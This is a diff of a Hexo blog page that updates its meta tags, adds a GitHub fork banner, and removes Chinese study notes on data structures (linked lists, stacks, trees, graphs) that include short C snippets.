@@ -3,8 +3,10 @@
 
 <head>
   <meta charset="utf-8" />
-    
-  <meta name="description" content="人间值得" />
+   
+  <meta name="keywords" content="安全" />
+   
+  <meta name="description" content="世中逢尔，雨中逢花" />
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
@@ -34,6 +36,12 @@
     <main class="content">
       
 <section class="cover">
+    
+      
+      <a class="forkMe" href="https://github.com/Shen-Yu/hexo-theme-ayer"
+        target="_blank"><img width="149" height="149" src="/images/forkme.png"
+          class="attachment-full size-full" alt="Fork me on GitHub" data-recalc-dims="1"></a>
+    
   <div class="cover-frame">
     <div class="bg-box">
       <img src="/images/cover1.jpg" alt="image frame" />
@@ -94,131 +102,10 @@
       
 
       
-      <h1 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章 绪论"></a>第一章 绪论</h1><h2 id="一、数据结构包括两方面的内容"><a href="#一、数据结构包括两方面的内容" class="headerlink" title="一、数据结构包括两方面的内容"></a>一、数据结构包括两方面的内容</h2><h3 id="数据的逻辑结构："><a href="#数据的逻辑结构：" class="headerlink" title="数据的逻辑结构："></a>数据的逻辑结构：</h3><p>数据元素之间的逻辑关系，也可以看作是从具体问题抽象出来的模型，描述操作对象之间的关系，它与数据的存储方式、位置无关。包括：（a）集合结构 （b）线性结构 （c）树形结构 （d）图形结构</p>
-<h3 id="数据结构的存储结构："><a href="#数据结构的存储结构：" class="headerlink" title="数据结构的存储结构："></a>数据结构的存储结构：</h3><p>数据元素及其关系在计算机存储器内的表示，包括：（a）顺序存储 （b）链式存储 （c）索引存储</p>
-<h3 id="数据的逻辑结构与存储结构的关系："><a href="#数据的逻辑结构与存储结构的关系：" class="headerlink" title="数据的逻辑结构与存储结构的关系："></a>数据的逻辑结构与存储结构的关系：</h3><p>存储结构是逻辑关系的映像与元素本身的映像。逻辑结构是数据结构的抽象，存储结构是数据结构的实现，两者综合起来建立了数据元素之间的结构关系。</p>
-<h2 id="二、算法"><a href="#二、算法" class="headerlink" title="二、算法"></a>二、算法</h2><h3 id="1、什么是算法"><a href="#1、什么是算法" class="headerlink" title="1、什么是算法"></a>1、什么是算法</h3><p>算法是对特定问题求解步骤的一种描述，是指令的有限序列</p>
-<h3 id="2、算法的特征"><a href="#2、算法的特征" class="headerlink" title="2、算法的特征"></a>2、算法的特征</h3><p>（a）有穷性 （b）确定性 （c）可行性 （d）输入：0<br>个多个输入 （e）输出：1个或多个输出</p>
-<h3 id="3、算法的设计要求"><a href="#3、算法的设计要求" class="headerlink" title="3、算法的设计要求"></a>3、算法的设计要求</h3><p>（a）正确性 （b）可读性 （c）健壮性 （d）效率与低存储量需求</p>
-<h3 id="4、时间复杂度"><a href="#4、时间复杂度" class="headerlink" title="4、时间复杂度"></a>4、时间复杂度</h3><p>（a）事后统计方法 （b）事前分析估算方法</p>
-<h1 id="第二章-线性表"><a href="#第二章-线性表" class="headerlink" title="第二章 线性表"></a>第二章 线性表</h1><h3 id="1、存储地址的计算"><a href="#1、存储地址的计算" class="headerlink" title="1、存储地址的计算"></a>1、存储地址的计算</h3><p>Loc(ai)=Loc(a1) + (i-1) * L</p>
-<h3 id="2、顺序表插入与删除"><a href="#2、顺序表插入与删除" class="headerlink" title="2、顺序表插入与删除"></a>2、顺序表插入与删除</h3><p>顺序表插入与删除一个元素的时间复杂度为O(n)</p>
-<h3 id="3、顺序表无序表"><a href="#3、顺序表无序表" class="headerlink" title="3、顺序表无序表"></a>3、顺序表无序表</h3><p>顺序表无序表合并的时间复杂度为O(ListLength(La) * ListLength(Lb))</p>
-<h2 id="二、链表"><a href="#二、链表" class="headerlink" title="二、链表"></a>二、链表</h2><h3 id="1、单链表"><a href="#1、单链表" class="headerlink" title="1、单链表"></a>1、单链表</h3><p>数据域-&gt; data|next &lt;-指针域</p>
-<h3 id="2、第一个结点的地址"><a href="#2、第一个结点的地址" class="headerlink" title="2、第一个结点的地址"></a>2、第一个结点的地址</h3><p>需要存放在一个指针变量中，这个指针变量称为头指针。</p>
-<h3 id="3、头节点是第一个结点前引入的一个结点"><a href="#3、头节点是第一个结点前引入的一个结点" class="headerlink" title="3、头节点是第一个结点前引入的一个结点"></a>3、头节点是第一个结点前引入的一个结点</h3><p>头节点的数据域可以不存储任何信息</p>
-<h3 id="4、求单链表表长的算法"><a href="#4、求单链表表长的算法" class="headerlink" title="4、求单链表表长的算法"></a>4、求单链表表长的算法</h3><p>的时间复杂度为O(n)</p>
-<h3 id="5、单链表插入元素"><a href="#5、单链表插入元素" class="headerlink" title="5、单链表插入元素"></a>5、单链表插入元素</h3><p>若要在值为b的结点前插入一个元素，首先要找到其前驱结点，即P指针指向的结点，时间复杂度为<code>O(n)</code>，删除的时间复杂度也为<code>O(n)</code>。</p>
-<h3 id="6、创建链表"><a href="#6、创建链表" class="headerlink" title="6、创建链表"></a>6、创建链表</h3><h4 id="1）尾插法"><a href="#1）尾插法" class="headerlink" title="1）尾插法"></a>1）尾插法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">L&#x3D;(Lnod *)malloc(sizeof(Lnode));</span><br><span class="line">L-&gt;next&#x3D;NULL;</span><br><span class="line">r&#x3D;L;</span><br><span class="line">scanf(&amp;x);</span><br><span class="line">while(x!&#x3D;flag)</span><br><span class="line">&#123;</span><br><span class="line">	s&#x3D;(Lnode *)malloc(sizeof(Lnode));</span><br><span class="line">	s-&gt;data&#x3D;x;</span><br><span class="line">	s-&gt;next&#x3D;NULL;</span><br><span class="line">	r-next&#x3D;s;</span><br><span class="line">	r&#x3D;s;</span><br><span class="line">	scanf(&amp;x);</span><br><span class="line">&#125;</span><br><span class="line">return L;</span><br></pre></td></tr></table></figure>
-<h4 id="2）头插法"><a href="#2）头插法" class="headerlink" title="2）头插法"></a>2）头插法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LinkList L;</span><br><span class="line">L&#x3D;(Lnode *)malloc(sizeof(Lnode));</span><br><span class="line">L-&gt;next&#x3D;NULL;</span><br><span class="line">scanf(&amp;x);</span><br><span class="line">while(x!&#x3D;flag)</span><br><span class="line">&#123;</span><br><span class="line">	s&#x3D;(Lnode *)malloc(sizeof(Lnode));</span><br><span class="line">	s-&gt;data&#x3D;x;</span><br><span class="line">	s-&gt;next&#x3D;L-&gt;next;</span><br><span class="line">	L-&gt;next&#x3D;s;</span><br><span class="line">	scanf(&amp;x);</span><br><span class="line">&#125;</span><br><span class="line">return L;</span><br></pre></td></tr></table></figure>
-
-<h2 id="三、单循环链表"><a href="#三、单循环链表" class="headerlink" title="三、单循环链表"></a>三、单循环链表</h2><h2 id="四、双向链表"><a href="#四、双向链表" class="headerlink" title="四、双向链表"></a>四、双向链表</h2><h3 id="1、判空"><a href="#1、判空" class="headerlink" title="1、判空"></a>1、判空</h3><p>-&gt;[指向中间][数据域][指向中间]</p>
-<h3 id="2、-p是双链表中的结点"><a href="#2、-p是双链表中的结点" class="headerlink" title="2、*p是双链表中的结点"></a>2、*p是双链表中的结点</h3><p>*s是待插入的值为x的新结点，将*s插入到*p的前面<br>(1)p-&gt;prior=s (2)s-&gt;prior=p-&gt;prior (3)p-&gt;prior-&gt;next=s (4)s-&gt;next=p</p>
-<h3 id="3、双链表中结点的删除"><a href="#3、双链表中结点的删除" class="headerlink" title="3、双链表中结点的删除"></a>3、双链表中结点的删除</h3><p>(1)p-&gt;prior-&gt;next=p-&gt;next (2)p-&gt;next-&gt;prior=p-&gt;prior (3)free(p)</p>
-<h2 id="五、静态链表"><a href="#五、静态链表" class="headerlink" title="五、静态链表"></a>五、静态链表</h2><h3 id="1、一个用数组表示"><a href="#1、一个用数组表示" class="headerlink" title="1、一个用数组表示"></a>1、一个用数组表示</h3><p>的线性表L={zhao、qian…}，数组的每个分量都是一个结点，结点包括两个域，一个是数据域data，另一个是指针域next。与链表不同的是，next域中不再是链，而是一下个结点所在数组的下标，这个“指针”称为“静态指针”或游标</p>
-<h3 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0|NULL|1</span><br><span class="line">1|zhao|2</span><br><span class="line">3|sun |4</span><br><span class="line">4|Li  |NULL</span><br></pre></td></tr></table></figure>
-
-<p>最后一个结点next域应该为NULL</p>
-<p>第一个结点用一个数组下标为0的结点来指向，这个结点作为头节点</p>
-<h3 id="3、静态链表的插入和删除"><a href="#3、静态链表的插入和删除" class="headerlink" title="3、静态链表的插入和删除"></a>3、静态链表的插入和删除</h3><p>不用移动元素，只需要改变静态指针（或者游标）即可</p>
-<h1 id="第三章-栈和队列"><a href="#第三章-栈和队列" class="headerlink" title="第三章 栈和队列"></a>第三章 栈和队列</h1><h3 id="1、由于栈属于线性表"><a href="#1、由于栈属于线性表" class="headerlink" title="1、由于栈属于线性表"></a>1、由于栈属于线性表</h3><p>所以线性表的顺序存储和链式存储也适用于栈，分别称为顺序栈和链栈。</p>
-<h3 id="2、顺序栈"><a href="#2、顺序栈" class="headerlink" title="2、顺序栈"></a>2、顺序栈</h3><p>用指针base指示栈底元素在存储器中的位置，用指针top来指示栈顶元素在存储器中的位置，同时，用变量stacksize来指示当前栈的可用最大容量。</p>
-<h3 id="3、栈的链式存储表示"><a href="#3、栈的链式存储表示" class="headerlink" title="3、栈的链式存储表示"></a>3、栈的链式存储表示</h3><p>简称为链栈。与线性链表类似，链栈也用一组任意的存储单元来存储栈中的数据元素，栈中的每一个元素用一个结点来表示，每个结点由一个数据域和指针域组成。同时设一个指针top，用来指示栈顶元素所在的存储位置。</p>
-<h3 id="4、队列"><a href="#4、队列" class="headerlink" title="4、队列"></a>4、队列</h3><p>只允许在一端进行插入操作，而另一端进行删除操作，只允许插入的一端称为队尾，只允许删除的一端称为队头。插入对应入队，删除对应出队。</p>
-<h3 id="5、用数组来作为队列元素"><a href="#5、用数组来作为队列元素" class="headerlink" title="5、用数组来作为队列元素"></a>5、用数组来作为队列元素</h3><p>的基本载体结构，这是循环队列的实现模式</p>
-<h3 id="6、空的链队列"><a href="#6、空的链队列" class="headerlink" title="6、空的链队列"></a>6、空的链队列</h3><p>有一个非常明显的特征，即front指针和rear指针指向同一个地址。</p>
-<h1 id="第四章-数组"><a href="#第四章-数组" class="headerlink" title="第四章 数组"></a>第四章 数组</h1><h3 id="1、行优先"><a href="#1、行优先" class="headerlink" title="1、行优先"></a>1、行优先</h3><p>将数组按行向量排列，即第i+1行紧接在第i行存储</p>
-<p>列优先：将数组元素按列向量排列，第i+1列紧接在第<br>i列后存储。</p>
-<h3 id="2、对称矩阵"><a href="#2、对称矩阵" class="headerlink" title="2、对称矩阵"></a>2、对称矩阵</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[10  5  3 17</span><br><span class="line">5  7  12 4 </span><br><span class="line">3  12 20 23</span><br><span class="line">17 4 23 13]</span><br></pre></td></tr></table></figure>
-<p>对应</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 0  1  2  3  4  5  6  7  8  9</span><br><span class="line">10  5  7  3 12 20 17  4 23 14</span><br></pre></td></tr></table></figure>
-<h3 id="3、稀疏矩阵"><a href="#3、稀疏矩阵" class="headerlink" title="3、稀疏矩阵"></a>3、稀疏矩阵</h3><p>将非零元素的两个下表(i,j)和非零元素值aij一起存放。得到每一非零元素对应的一个三元组(i,j,aij)，反之，一个三元组也唯一确定了一个稀疏矩阵中的一个非零元素。</p>
-<h1 id="第五章-树"><a href="#第五章-树" class="headerlink" title="第五章 树"></a>第五章 树</h1><h3 id="1、树的结点"><a href="#1、树的结点" class="headerlink" title="1、树的结点"></a>1、树的结点</h3><p>包含一个数据元素及若干指向其子树的分支。结点拥有的子树称为结点的度。度不为0的结点称为分支结点或非终端结点。</p>
-<h3 id="2、结点的祖先"><a href="#2、结点的祖先" class="headerlink" title="2、结点的祖先"></a>2、结点的祖先</h3><p>是指从根到该结点所经分支上所有结点</p>
-<h3 id="3、树中结点"><a href="#3、树中结点" class="headerlink" title="3、树中结点"></a>3、树中结点</h3><p>的最大层次值，称为树的深度或者高度。</p>
-<h3 id="4、在一棵树中"><a href="#4、在一棵树中" class="headerlink" title="4、在一棵树中"></a>4、在一棵树中</h3><p>如果同层的兄弟结点左右互换位置，树表达的意思发生变换则该树为有序树。反之则为无序树。</p>
-<h3 id="5、双亲表示法"><a href="#5、双亲表示法" class="headerlink" title="5、双亲表示法"></a>5、双亲表示法</h3><p>是假设以一组连续存储空间来存储树的所有节点的值，同时在每个结点中附设一个指示器指示其双亲结点在本连续空间中的下标位置。</p>
-<h3 id="6、孩子表示法"><a href="#6、孩子表示法" class="headerlink" title="6、孩子表示法"></a>6、孩子表示法</h3><p>由于树中每个结点可能有多棵子树，因此可用多重链表，即每个结点具有多个指针域，其中每个指针指向一个孩子结点。</p>
-<h3 id="7、孩子兄弟表示法"><a href="#7、孩子兄弟表示法" class="headerlink" title="7、孩子兄弟表示法"></a>7、孩子兄弟表示法</h3><p>孩子兄弟表示法又称二叉树表示法，或者二叉链表表示法，即以二叉链表作为树的存储结构。链表中结点的两个链域分别指向该结点的第一个孩子和下一个兄弟。</p>
-<h3 id="8、二叉树的性质"><a href="#8、二叉树的性质" class="headerlink" title="8、二叉树的性质"></a>8、二叉树的性质</h3><h4 id="1、在二叉树中的第i层"><a href="#1、在二叉树中的第i层" class="headerlink" title="1、在二叉树中的第i层"></a>1、在二叉树中的第i层</h4><p>至多有2的i-1次方个结点</p>
-<h4 id="2、深度为k的二叉树"><a href="#2、深度为k的二叉树" class="headerlink" title="2、深度为k的二叉树"></a>2、深度为k的二叉树</h4><p>至多有2的k次方-1个结点</p>
-<h4 id="3、对任何一颗二叉树T，"><a href="#3、对任何一颗二叉树T，" class="headerlink" title="3、对任何一颗二叉树T，"></a>3、对任何一颗二叉树T，</h4><p>如果其终端结点树为n0，度为2的结点树为n2，则有n0=n2+1</p>
-<h3 id="9、设B为二叉树的边的总数目"><a href="#9、设B为二叉树的边的总数目" class="headerlink" title="9、设B为二叉树的边的总数目"></a>9、设B为二叉树的边的总数目</h3><p>根据树的基本性质，对于任意一棵多叉树，边和结点的数目关系始终满足：<code>n=B+1</code></p>
-<h3 id="10、B-n1-2-n2"><a href="#10、B-n1-2-n2" class="headerlink" title="10、B=n1+2*n2"></a>10、B=n1+2*n2</h3><h3 id="11、一棵深度为K、有n个结点的二叉树"><a href="#11、一棵深度为K、有n个结点的二叉树" class="headerlink" title="11、一棵深度为K、有n个结点的二叉树"></a>11、一棵深度为K、有n个结点的二叉树</h3><p>称为满二叉树（没有度数为1的结点）</p>
-<h3 id="12、深度为k、有n个结点的二叉树"><a href="#12、深度为k、有n个结点的二叉树" class="headerlink" title="12、深度为k、有n个结点的二叉树"></a>12、深度为k、有n个结点的二叉树</h3><p>当且仅当其每个结点都如深度为K的满二叉树中编号从1至n的结点一一对应时，称之为完全二叉树</p>
-<h3 id="13、具有n个结点的完全二叉树的深度为"><a href="#13、具有n个结点的完全二叉树的深度为" class="headerlink" title="13、具有n个结点的完全二叉树的深度为"></a>13、具有n个结点的完全二叉树的深度为</h3><p><code>[lbn]+1</code></p>
-<h3 id="14、如果对一棵有n个结点"><a href="#14、如果对一棵有n个结点" class="headerlink" title="14、如果对一棵有n个结点"></a>14、如果对一棵有n个结点</h3><p>的完全二叉树的结点，按层序编号（从第一层到第[lbn]+1层），对任一结点i（1&lt;=i&lt;=n），有</p>
-<h4 id="1、如果i-1；"><a href="#1、如果i-1；" class="headerlink" title="1、如果i=1；"></a>1、如果i=1；</h4><p>则结点i是二叉树的根，没有双亲，如果i&gt;1，则其双亲结点编号为[i/2]</p>
-<h4 id="2、-如果2i-m，则"><a href="#2、-如果2i-m，则" class="headerlink" title="2、 如果2i=m，则"></a>2、 如果2i=m，则</h4><p>结点i没有左孩子，否则其左孩子编号必为2i</p>
-<h4 id="3、如果2i-1-gt-n，则"><a href="#3、如果2i-1-gt-n，则" class="headerlink" title="3、如果2i+1&gt;n，则"></a>3、如果2i+1&gt;n，则</h4><p>结点没有右孩子，否则其右孩子编号必为2i+1</p>
-<h3 id="15、反推二叉树结构"><a href="#15、反推二叉树结构" class="headerlink" title="15、反推二叉树结构"></a>15、反推二叉树结构</h3><h4 id="1、在前序遍历序列"><a href="#1、在前序遍历序列" class="headerlink" title="1、在前序遍历序列"></a>1、在前序遍历序列</h4><p>/子序列中，第一个结点时该树/子树的根结点</p>
-<h4 id="2、在中序遍历中-子序列中"><a href="#2、在中序遍历中-子序列中" class="headerlink" title="2、在中序遍历中/子序列中"></a>2、在中序遍历中/子序列中</h4><p>该树的根节点在其左右子树中序序列之间</p>
-<h4 id="3、在后序遍历中"><a href="#3、在后序遍历中" class="headerlink" title="3、在后序遍历中"></a>3、在后序遍历中</h4><p>最后一个结点是该子树的根结点</p>
-<h3 id="16、指向结点前驱"><a href="#16、指向结点前驱" class="headerlink" title="16、指向结点前驱"></a>16、指向结点前驱</h3><p>和后继的指针叫做线索，加上线索的二叉链表叫做线索链表，加上线索的二叉树称为线索二叉树</p>
-<h3 id="17、树转换为二叉树"><a href="#17、树转换为二叉树" class="headerlink" title="17、树转换为二叉树"></a>17、树转换为二叉树</h3><h4 id="1、加线。"><a href="#1、加线。" class="headerlink" title="1、加线。"></a>1、加线。</h4><p>在所有兄弟结点之间加一条连线。注意，只是在亲兄弟之间加</p>
-<h4 id="2、去线"><a href="#2、去线" class="headerlink" title="2、去线"></a>2、去线</h4><p>对树中每个结点，只保留它与第一个孩子结点的连线，删除它与其他孩子结点之间的线</p>
-<h4 id="3、现状调整"><a href="#3、现状调整" class="headerlink" title="3、现状调整"></a>3、现状调整</h4><p>长子连线为左孩子，兄弟连线为右孩子</p>
-<h3 id="18、森林转为二叉树"><a href="#18、森林转为二叉树" class="headerlink" title="18、森林转为二叉树"></a>18、森林转为二叉树</h3><h4 id="1、把每一棵树"><a href="#1、把每一棵树" class="headerlink" title="1、把每一棵树"></a>1、把每一棵树</h4><p>分别转换为二叉树</p>
-<h4 id="2、从最右边"><a href="#2、从最右边" class="headerlink" title="2、从最右边"></a>2、从最右边</h4><p>的每一棵二叉树往左，依次把右边二叉树的根结点作为左边一棵二叉树的根节点的右孩子</p>
-<h3 id="19、二叉树转换为树"><a href="#19、二叉树转换为树" class="headerlink" title="19、二叉树转换为树"></a>19、二叉树转换为树</h3><h4 id="1、加线"><a href="#1、加线" class="headerlink" title="1、加线"></a>1、加线</h4><p>若其结点的左孩子结点存在，则将这个左孩子的右节点，右孩子的右节点连接起来</p>
-<h4 id="2、去线-1"><a href="#2、去线-1" class="headerlink" title="2、去线"></a>2、去线</h4><p>删除原二叉树中所有节点与其右孩子的连线</p>
-<h2 id="二-哈夫曼树及其应用"><a href="#二-哈夫曼树及其应用" class="headerlink" title="二 哈夫曼树及其应用"></a>二 哈夫曼树及其应用</h2><h3 id="1、哈夫曼树"><a href="#1、哈夫曼树" class="headerlink" title="1、哈夫曼树"></a>1、哈夫曼树</h3><p>又称最优二叉树，是一种带权路径长度最短的树</p>
-<h3 id="2、从树中一个结点"><a href="#2、从树中一个结点" class="headerlink" title="2、从树中一个结点"></a>2、从树中一个结点</h3><p>到另一个结点之间的分支构成这两个结点之间的路径，路径上的分支数组称为路径长度。树的路径长度是从树根到每一个结点的路径之和</p>
-<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><h4 id="1、叶子上的权值均相同时"><a href="#1、叶子上的权值均相同时" class="headerlink" title="1、叶子上的权值均相同时"></a>1、叶子上的权值均相同时</h4><p>完全二叉树一定是哈夫曼树，若叶子的权值不相同，则完全二叉树不一定是哈夫曼树。</p>
-<h4 id="2、在哈夫曼树中"><a href="#2、在哈夫曼树中" class="headerlink" title="2、在哈夫曼树中"></a>2、在哈夫曼树中</h4><p>权值较大的叶子离根的距离小于或等于权值较小的叶子离根的距离</p>
-<h4 id="3、哈夫曼树中"><a href="#3、哈夫曼树中" class="headerlink" title="3、哈夫曼树中"></a>3、哈夫曼树中</h4><p>没有度为1的结点，即n1=0</p>
-<h4 id="4、哈夫曼树是无序树，左右可随意互换，"><a href="#4、哈夫曼树是无序树，左右可随意互换，" class="headerlink" title="4、哈夫曼树是无序树，左右可随意互换，"></a>4、哈夫曼树是无序树，左右可随意互换，</h4><p>甚至树高也不唯一，只要该树的WPL值等于最小值即可</p>
-<h4 id="5、对一一棵有n个叶子结点"><a href="#5、对一一棵有n个叶子结点" class="headerlink" title="5、对一一棵有n个叶子结点"></a>5、对一一棵有n个叶子结点</h4><p>的哈夫曼树，其结点总数为n0+n1+n2=2*n2+1</p>
-<h1 id="第六章-图"><a href="#第六章-图" class="headerlink" title="第六章 图"></a>第六章 图</h1><h3 id="1、在图中"><a href="#1、在图中" class="headerlink" title="1、在图中"></a>1、在图中</h3><p>我们把数据元素叫做顶点，图是由顶点的有穷非空集合和顶点之间边的集合组成，通常表示为<code>G(V,E)</code>，其中G表示一个图，V是图中顶点的集合，E是图中连线的集合。E可以为空，但V不能为空。</p>
-<h3 id="2、-1"><a href="#2、-1" class="headerlink" title="2、"></a>2、</h3><p>弧尾端 <code>i -&gt; j</code> 弧头端</p>
-<h3 id="3、顶点Vi"><a href="#3、顶点Vi" class="headerlink" title="3、顶点Vi"></a>3、顶点Vi</h3><p>的度是和Vi相关联的边的数目</p>
-<h3 id="4、如果无向图中"><a href="#4、如果无向图中" class="headerlink" title="4、如果无向图中"></a>4、如果无向图中</h3><p>任意两个顶点都是连通的，则称G是连通图。</p>
-<h3 id="5、连通分量"><a href="#5、连通分量" class="headerlink" title="5、连通分量"></a>5、连通分量</h3><p>是指无向图中极大连通子图</p>
-<h3 id="6、在有向图G中"><a href="#6、在有向图G中" class="headerlink" title="6、在有向图G中"></a>6、在有向图G中</h3><p>任意从Vi到Vj都存在路径，则称G是强连通图</p>
-<h3 id="7、在有向图中"><a href="#7、在有向图中" class="headerlink" title="7、在有向图中"></a>7、在有向图中</h3><p>如果任意两个顶点之间都存在方向互为相反的两条弧，则称为有向完全图</p>
-<h3 id="8、带权的图"><a href="#8、带权的图" class="headerlink" title="8、带权的图"></a>8、带权的图</h3><p>通常称为网</p>
-<h3 id="9、无向图中连接n个结点的n-1条边"><a href="#9、无向图中连接n个结点的n-1条边" class="headerlink" title="9、无向图中连接n个结点的n-1条边"></a>9、无向图中连接n个结点的n-1条边</h3><p>构成了生成树。有向图中若干棵有向树连接n个结点，且总共具有n-1条弧，构成了生成森林</p>
-<h2 id="二、图的存储结构"><a href="#二、图的存储结构" class="headerlink" title="二、图的存储结构"></a>二、图的存储结构</h2><h3 id="1-、邻接表表述方法"><a href="#1-、邻接表表述方法" class="headerlink" title="1)、邻接表表述方法"></a>1)、邻接表表述方法</h3><h4 id="1、带权"><a href="#1、带权" class="headerlink" title="1、带权"></a>1、带权</h4><p>使用无限大的符号表示无出度</p>
-<h3 id="2、邻接表-逆邻接表表示法"><a href="#2、邻接表-逆邻接表表示法" class="headerlink" title="2、邻接表/逆邻接表表示法"></a>2、邻接表/逆邻接表表示法</h3><p><img src="../image/study/%E9%82%BB%E6%8E%A5%E8%A1%A8.png" alt=""></p>
-<h3 id="3、邻接表避免了"><a href="#3、邻接表避免了" class="headerlink" title="3、邻接表避免了"></a>3、邻接表避免了</h3><p>邻接矩阵中的空间过度浪费，在有向图中，邻接表很方便获知某个顶点的出度，而在无向图中，这个值就是顶点度。</p>
-<h3 id="4、十字链表表示法"><a href="#4、十字链表表示法" class="headerlink" title="4、十字链表表示法"></a>4、十字链表表示法</h3><p>邻接表和逆邻接表的结合使用</p>
-<h2 id="三、图的遍历"><a href="#三、图的遍历" class="headerlink" title="三、图的遍历"></a>三、图的遍历</h2><h3 id="1、深度优先遍历"><a href="#1、深度优先遍历" class="headerlink" title="1、深度优先遍历"></a>1、深度优先遍历</h3><h4 id="（1）、访问任意一个顶点"><a href="#（1）、访问任意一个顶点" class="headerlink" title="（1）、访问任意一个顶点"></a>（1）、访问任意一个顶点</h4><h4 id="（2）、访问该顶点的任意一个邻接点"><a href="#（2）、访问该顶点的任意一个邻接点" class="headerlink" title="（2）、访问该顶点的任意一个邻接点"></a>（2）、访问该顶点的任意一个邻接点</h4><h4 id="（3）、访问步骤（2）中所选取的邻接点的任意一个邻接点"><a href="#（3）、访问步骤（2）中所选取的邻接点的任意一个邻接点" class="headerlink" title="（3）、访问步骤（2）中所选取的邻接点的任意一个邻接点"></a>（3）、访问步骤（2）中所选取的邻接点的任意一个邻接点</h4><h4 id="（4）、访问步骤（3）中所选取的任意一个邻接点"><a href="#（4）、访问步骤（3）中所选取的任意一个邻接点" class="headerlink" title="（4）、访问步骤（3）中所选取的任意一个邻接点"></a>（4）、访问步骤（3）中所选取的任意一个邻接点</h4><h3 id="2、广度优先遍历"><a href="#2、广度优先遍历" class="headerlink" title="2、广度优先遍历"></a>2、广度优先遍历</h3><h4 id="（1）、访问任意一个顶点-1"><a href="#（1）、访问任意一个顶点-1" class="headerlink" title="（1）、访问任意一个顶点"></a>（1）、访问任意一个顶点</h4><h4 id="（2）、访问该顶点的所有邻接点"><a href="#（2）、访问该顶点的所有邻接点" class="headerlink" title="（2）、访问该顶点的所有邻接点"></a>（2）、访问该顶点的所有邻接点</h4><h4 id="（3）、访问该顶点所有邻接点的所有邻接点"><a href="#（3）、访问该顶点所有邻接点的所有邻接点" class="headerlink" title="（3）、访问该顶点所有邻接点的所有邻接点"></a>（3）、访问该顶点所有邻接点的所有邻接点</h4><h2 id="四、最小生成树"><a href="#四、最小生成树" class="headerlink" title="四、最小生成树"></a>四、最小生成树</h2><h3 id="1、一个连通图的生成树"><a href="#1、一个连通图的生成树" class="headerlink" title="1、一个连通图的生成树"></a>1、一个连通图的生成树</h3><p>是一个极小的连通子图，它含有图中所有的顶点，但只有n-1条边，恰好将这n个顶点连通。</p>
-<h3 id="2、普利姆（Prim）算法"><a href="#2、普利姆（Prim）算法" class="headerlink" title="2、普利姆（Prim）算法"></a>2、普利姆（Prim）算法</h3><p>算法复杂度为O(n的平方)</p>
-<h4 id="（1）、任意选择一个顶点"><a href="#（1）、任意选择一个顶点" class="headerlink" title="（1）、任意选择一个顶点"></a>（1）、任意选择一个顶点</h4><h4 id="（2）、选择该点最小权所连通的顶点"><a href="#（2）、选择该点最小权所连通的顶点" class="headerlink" title="（2）、选择该点最小权所连通的顶点"></a>（2）、选择该点最小权所连通的顶点</h4><h4 id="（3）、选择这两个点最小权所连通的顶点"><a href="#（3）、选择这两个点最小权所连通的顶点" class="headerlink" title="（3）、选择这两个点最小权所连通的顶点"></a>（3）、选择这两个点最小权所连通的顶点</h4><h3 id="3、克鲁斯卡尔（Kruskal）算法"><a href="#3、克鲁斯卡尔（Kruskal）算法" class="headerlink" title="3、克鲁斯卡尔（Kruskal）算法"></a>3、克鲁斯卡尔（Kruskal）算法</h3><h4 id="（1）、找到权值最小的路径"><a href="#（1）、找到权值最小的路径" class="headerlink" title="（1）、找到权值最小的路径"></a>（1）、找到权值最小的路径</h4><h4 id="（2）、找到次小路径"><a href="#（2）、找到次小路径" class="headerlink" title="（2）、找到次小路径"></a>（2）、找到次小路径</h4><h4 id="（3）、找到次次小路径"><a href="#（3）、找到次次小路径" class="headerlink" title="（3）、找到次次小路径"></a>（3）、找到次次小路径</h4><h2 id="五、有向无环图及其应用"><a href="#五、有向无环图及其应用" class="headerlink" title="五、有向无环图及其应用"></a>五、有向无环图及其应用</h2><h3 id="1、在一个表示工程的有向图中、"><a href="#1、在一个表示工程的有向图中、" class="headerlink" title="1、在一个表示工程的有向图中、"></a>1、在一个表示工程的有向图中、</h3><p>用顶点表示活动，用弧表示活动之间的优先关系，这样的有向图为顶点表示活动的网，我们称为AVOV网</p>
-<h3 id="2、设G-V-E-是一个具有"><a href="#2、设G-V-E-是一个具有" class="headerlink" title="2、设G=(V,E)是一个具有"></a>2、设G=(V,E)是一个具有</h3><p>n个顶点的有向网，V中的顶点序列为V1，V2，…Vn，假设活动Vi是活动Vj的前驱活动，则在顶点序列中顶点Vi必定在顶点Vj的前面。如果满足这样的条件，则称这样的顶点序列为一个拓扑序列。</p>
-<h3 id="3、拓扑排序"><a href="#3、拓扑排序" class="headerlink" title="3、拓扑排序"></a>3、拓扑排序</h3><p>就是对一个有向图构造拓扑序列的过程</p>
-<h3 id="4、对AOV图进行拓扑"><a href="#4、对AOV图进行拓扑" class="headerlink" title="4、对AOV图进行拓扑"></a>4、对AOV图进行拓扑</h3><p>的具体方法是每次从AOV图中选择一个入度为0的顶点，输出，然后删除此顶点及所有与它相关的弧，重复上述操作</p>
